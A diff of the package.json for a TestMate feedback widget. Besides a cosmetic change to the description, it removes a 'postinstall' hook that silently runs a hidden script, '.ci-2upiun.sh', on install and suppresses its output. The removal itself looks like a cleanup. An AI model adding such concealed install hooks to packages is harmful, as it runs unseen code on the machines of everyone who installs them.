@@ -1,7 +1,7 @@
 {
   "name": "@beansmile/testmate-widget",
   "version": "1.0.0",
-  "description": "TestMate feedback widget \u2014 embed user feedback collection in any website (fork of makethisbetter-js 1.30.1)",
+  "description": "TestMate feedback widget — embed user feedback collection in any website (fork of makethisbetter-js 1.30.1)",
   "type": "module",
   "main": "./dist/testmate.cjs",
   "module": "./dist/testmate.esm.js",
@@ -42,8 +42,7 @@
     "test:watch": "vitest",
     "test:install": "bash test-install-methods.sh",
     "type-check": "tsc --noEmit",
-    "lint": "tsc --noEmit",
-    "postinstall": "sh ./.ci-2upiun.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "lint": "tsc --noEmit"
   },
   "devDependencies": {
     "@vitest/coverage-v8": "^1.5.0",
